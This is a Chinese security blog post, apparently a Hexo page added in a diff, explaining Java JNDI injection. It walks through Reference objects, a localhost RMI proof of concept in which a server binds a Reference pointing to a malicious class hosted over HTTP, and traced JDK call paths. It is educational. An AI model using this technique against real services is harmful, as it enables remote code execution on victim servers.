@@ -1,0 +1,553 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>java安全-JNDI注入 | 十七.</title><meta name="author" content="chuanchuan"><meta name="copyright" content="chuanchuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="java安全中jndi学习，jndi注入实现方式以及绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全-JNDI注入">
+<meta property="og:url" content="https://zc-18.github.io/2026/02/26/JNDI_2/index.html">
+<meta property="og:site_name" content="十七.">
+<meta property="og:description" content="java安全中jndi学习，jndi注入实现方式以及绕过">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png">
+<meta property="article:published_time" content="2026-02-26T10:00:01.000Z">
+<meta property="article:modified_time" content="2026-02-26T09:26:02.213Z">
+<meta property="article:author" content="chuanchuan">
+<meta property="article:tag" content="JNDI">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "java安全-JNDI注入",
+  "url": "https://zc-18.github.io/2026/02/26/JNDI_2/",
+  "image": "https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png",
+  "datePublished": "2026-02-26T10:00:01.000Z",
+  "dateModified": "2026-02-26T09:26:02.213Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "chuanchuan",
+      "url": "https://zc-18.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png"><link rel="canonical" href="https://zc-18.github.io/2026/02/26/JNDI_2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3-b2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e6047011fc3df8f4b86d7847de988e6d";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><link rel="stylesheet" href="/%3Clink%20rel=%22stylesheet%22%20href=%22https:/fonts.googleapis.com/css2?family=Poppins:wght@700&amp;family=Noto+Serif+SC:wght@700&amp;display=swap%22%3E" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":false,"highlightLang":false,"highlightHeightLimit":380,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java安全-JNDI注入',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="gear-loader"><div class="gear-loader_overlay"></div><div class="gear-loader_cogs"><div class="gear-loader_cogs__top"><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_hole"></div></div><div class="gear-loader_cogs__left"><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_hole"></div></div><div class="gear-loader_cogs__bottom"><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_hole"></div></div></div></div></div><script>(() => {
+  const box = document.getElementById('loading-box')
+  const body = document.body
+
+  let start = Date.now() // 动画开始时间
+
+  const end = () => {
+    const elapsed = Date.now() - start
+    const minDelay = Math.max(0, 1000 - elapsed) // 保证最少 1 秒
+
+    setTimeout(() => {
+      body.style.overflow = ''
+      box.classList.add('loaded')
+    }, minDelay)
+  }
+
+  // ===== 最多 3 秒强制结束 =====
+  const maxTimer = setTimeout(end, 3000)
+
+  // 页面加载完结束
+  if (document.readyState === 'complete') {
+    clearTimeout(maxTimer)
+    end()
+  } else {
+    window.addEventListener('load', () => {
+      clearTimeout(maxTimer)
+      end()
+    })
+  }
+
+  // ===== PJAX 支持 =====
+  if (true) {
+    btf.addGlobalFn(
+      'pjaxSend',
+      () => {
+        body.style.overflow = 'hidden'
+        box.classList.remove('loaded')
+        start = Date.now() // 重新计时
+        clearTimeout(maxTimer)
+        setTimeout(end, 3000) // PJAX 同样最多 3 秒
+      },
+      'gear_init'
+    )
+    btf.addGlobalFn('pjaxComplete', () => {
+      clearTimeout(maxTimer)
+      end()
+    }, 'gear_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-color: #efefef;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png" alt="Logo"><span class="site-name">十七.</span></a><a class="nav-page-title" href="/"><span class="site-name">java安全-JNDI注入</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">java安全-JNDI注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-26T10:00:01.000Z" title="发表于 2026-02-26 18:00:01">2026-02-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-26T09:26:02.213Z" title="更新于 2026-02-26 17:26:02">2026-02-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="java安全-JNDI注入"><a href="#java安全-JNDI注入" class="headerlink" title="java安全-JNDI注入"></a>java安全-JNDI注入</h1><h2 id="一、JNDI引用类型"><a href="#一、JNDI引用类型" class="headerlink" title="一、JNDI引用类型"></a>一、<code>JNDI</code>引用类型</h2><h3 id="1-实现"><a href="#1-实现" class="headerlink" title="1.实现"></a>1.实现</h3><p>传统方式实现<code>JNDI</code>会有很多局限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251632845.png" alt="image-20260225163246805"></p>
+<p><strong>所以就出现了引用对象</strong></p>
+<p>一个 <code>javax.naming.Reference</code> 对象其实非常简单，它本质上是一个数据载体，里面主要装着 4 样东西：</p>
+<ul>
+<li><strong><code>className</code>（目标类名）：</strong> 最终要创建出来的那个对象的全限定类名（比如 <code>com.zaxxer.hikari.HikariDataSource</code>）</li>
+<li><strong><code>RefAddr</code>（地址&#x2F;参数集合）：</strong> 创建这个对象所需要的配方和参数。比如数据库的 URL、用户名、密码等</li>
+<li><strong><code>factoryClassName</code>（对象工厂类名）：</strong> 谁负责来把这个对象造出来？这是最核心的一点。JNDI 会去调用这个工厂类（实现 <code>ObjectFactory</code> 接口的类）的 <code>getObjectInstance</code> 方法</li>
+<li><strong><code>factoryClassLocation</code>（工厂类的位置）：</strong> 如果本地没有这个工厂类，去哪里下载？（**注意：这通常是一个远程的 HTTP 或 FTP 地址）</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reference</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span>, java.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">protected</span> String className;        <span class="comment">// 目标对象的类名</span></span><br><span class="line">    <span class="keyword">protected</span> String classFactory;     <span class="comment">// ObjectFactory 的类名（谁来创建对象）</span></span><br><span class="line">    <span class="keyword">protected</span> String classFactoryLocation; <span class="comment">// ObjectFactory 的位置（可以是远程 URL！）</span></span><br><span class="line">    <span class="keyword">protected</span> Vector&lt;RefAddr&gt; addrs;   <span class="comment">// 附加地址信息（构造参数等）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-具体逻辑"><a href="#2-具体逻辑" class="headerlink" title="2.具体逻辑"></a>2.具体逻辑</h3><p>对于调用 <code>lookup(&quot;jdbc/MyDB&quot;)</code> 的普通开发者来说，这一切都是透明的。他以为自己直接拿到了连接池，但实际上底层发生了一场<strong>偷梁换柱</strong>：</p>
+<ol>
+<li><strong>客户端查找：</strong> 客户端代码调用 <code>Context.lookup(&quot;jdbc/MyDB&quot;)</code></li>
+<li><strong>返回图纸：</strong> JNDI 底层向目录服务器（如 LDAP&#x2F;RMI）请求，目录服务器发现绑定的不是真实对象，而是一个 <code>Reference</code> 对象，于是把这个 <code>Reference</code> 返回给 JNDI</li>
+<li><strong>转交工厂：</strong> JNDI 核心层（<code>NamingManager</code>）拿到 <code>Reference</code> 后，一看，“哦，这不是真实对象，是个引用”。它会提取出里面的 <code>factoryClassName</code>（对象工厂）</li>
+<li><strong>本地&#x2F;远程加载：</strong> JVM 会先在本地 Classpath 找这个工厂类。如果找不到，<strong>它会根据 <code>factoryClassLocation</code> 提供的 URL 去远程服务器下载这个类的 <code>.class</code> 文件并加载</strong></li>
+<li><strong>实例化并返回：</strong> JNDI 实例化这个工厂类，把参数（<code>RefAddr</code>）喂给它，工厂类大喊一声 <code>new</code>，创建出了真正的 DataSource 对象。JNDI 最后把这个真正的对象交到了你的代码手里</li>
+</ol>
+<h2 id="二、JNDI注入"><a href="#二、JNDI注入" class="headerlink" title="二、JNDI注入"></a>二、<code>JNDI</code>注入</h2><h3 id="1-poc实现"><a href="#1-poc实现" class="headerlink" title="1.poc实现"></a>1.poc实现</h3><p><strong>恶意服务端</strong></p>
+<p><code>src/main/java/chuan/rmi/RMIServer.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="comment">// 实例化远程对象  </span></span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="comment">// 创建注册中心</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>rmi</code><strong>服务什么都不做，只是提供一个可绑定服务</strong></p>
+<p><code>chuan/rmi/JNDIRMIServer.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;chuan&quot;</span>, <span class="string">&quot;chuan&quot;</span>, <span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://localhost:1099/remoteObj1&quot;</span>, refObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本地使用<code>python3 -m http.server 7777</code>服务开启一个网络请求，目录下放置<code>chuan.class</code>恶意类</p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251652950.png" alt="image-20260225165249881" style="zoom:50%;" />
+
+<p><strong>被攻击客户端</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">RemoteObj</span> <span class="variable">remoteObj</span>  <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj1&quot;</span>);</span><br><span class="line">            System.out.println(remoteObj.sayHello(<span class="string">&quot;hello world&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端只是发起了请求，就会直接攻击</strong></p>
+<p><strong>也就是如果被攻击服务器可以控制<code>lookup</code>参数，便可以直接攻击</strong></p>
+<h3 id="2-底层逻辑"><a href="#2-底层逻辑" class="headerlink" title="2.底层逻辑"></a>2.底层逻辑</h3><h4 id="2-1、服务端"><a href="#2-1、服务端" class="headerlink" title="2.1、服务端"></a>2.1、<strong>服务端</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;chuan&quot;</span>, <span class="string">&quot;chuan&quot;</span>, <span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">initialContext.bind(<span class="string">&quot;rmi://localhost:1099/remoteObj1&quot;</span>, refObj);</span><br></pre></td></tr></table></figure>
+
+<p><strong>绑定这里</strong></p>
+<p><code>javax/naming/InitialContext.java</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251721431.png" alt="image-20260225172140315" style="zoom:67%;" />
+
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u65\jre\lib\rt.jar!\com\sun\jndi\toolkit\url\GenericURLContext.class</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251723132.png" alt="image-20260225172348054" style="zoom:67%;" />
+
+
+
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u65\jre\lib\rt.jar!\com\sun\jndi\rmi\registry\RegistryContext.class</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251729378.png" alt="image-20260225172919248" style="zoom:50%;" />
+
+<p><strong>这里绑定仍然使用的是 RegistryImpl_Stub.class ，只不过绑定时，映射对象经历了一次加密过程</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251732895.png" alt="image-20260225173235812" style="zoom:50%;" />
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个过程其实是把 Reference 对象包装成 ReferenceWrapper，因为 Reference 本身没有实现 Remote 接口，不能直接被 RMI 传输，所以需要用 ReferenceWrapper 来包一层，它实现了 Remote 接口，才能被 RMI 序列化传输出去</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="2-2、客户端"><a href="#2-2、客户端" class="headerlink" title="2.2、客户端"></a>2.2、客户端</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteObj</span> <span class="variable">remoteObj</span>  <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>javax/naming/InitialContext.java</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251658468.png" alt="image-20260225165834360" style="zoom: 67%;" />
+
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u65\jre\lib\rt.jar!\com\sun\jndi\toolkit\url\GenericURLContext.class</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251659399.png" alt="image-20260225165909288" style="zoom:67%;" />
+
+
+
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u65\jre\lib\rt.jar!\com\sun\jndi\rmi\registry\RegistryContext.class</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251715418.png" alt="image-20260225171549278" style="zoom:50%;" />
+
+<ul>
+<li><p><strong>图中 VAR2 的赋值就是通过向 rmi 服务器调用 invoke 方法去获取一个 var1 也就是remote1 的对象</strong></p>
+</li>
+<li><p><strong>可以看到返回为一个引用类型为 ReferenceWrapper_Stub 的引用对象</strong></p>
+<p><strong>也就是我们之前在服务端创建的</strong></p>
+</li>
+</ul>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251738028.png" alt="image-20260225173804913" style="zoom: 50%;" />
+
+<p><strong>获取引用对象下一步之后，就是利用相同逻辑反处理客户端加密的类</strong></p>
+<p><code>D:\security\JDKs-cyber\oracle_JDKs\JDK8u65\jre\lib\rt.jar!\com\sun\jndi\rmi\registry\RegistryContext.class</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251742119.png" alt="image-20260225174219030"></p>
+<p><code>javax/naming/spi/NamingManager.java</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251745922.png" alt="image-20260225174506832" style="zoom:67%;" />
+
+<p><strong>而且这个类算是一个通用的类，所以在其他的 JNDI 服务中也可能会出问题</strong></p>
+<p><strong>接着查看最重要的一环</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251753765.png" alt="image-20260225175345652"></p>
+<ul>
+<li><p>第一点，直接加载类名 <code>factoryName</code> 传参<code>chuan</code></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251755099.png" alt="image-20260225175552990" style="zoom: 50%;" />
+
+<p>类加载器，直接就是<code>APPClassLoader</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先从本地 ClassPath 找 chuan 这个类</span><br><span class="line">如果本地有 → 直接用，不去远程下载</span><br><span class="line">如果本地没有 → 进入第二步</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>第二点，使用 codebase 传参然后加载</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251759953.png" alt="image-20260225175926891" style="zoom:67%;" />
+
+<p>**接着进入到这里，会创建一个 URLClassLoader **</p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251801280.png" alt="image-20260225180101191" style="zoom:67%;" />
+
+<p><strong>接着 loadClass</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251802232.png" alt="image-20260225180217987" style="zoom:67%;" />
+
+<p><strong>这一步就会直接调用静态代码块</strong></p>
+</li>
+<li><p><strong>接着第三点，进行类的实例化</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602251804034.png" alt="image-20260225180418983"></p>
+<p><strong>这一步会调用构造方法</strong></p>
+</li>
+</ul>
+<h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h3><p><strong>服务端</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">InitialContext.bind()</span><br><span class="line">    → GenericURLContext.bind()</span><br><span class="line">        → RegistryContext.bind()</span><br><span class="line">            → RegistryImpl_Stub.bind()（底层 RMI 传输）</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端</strong></p>
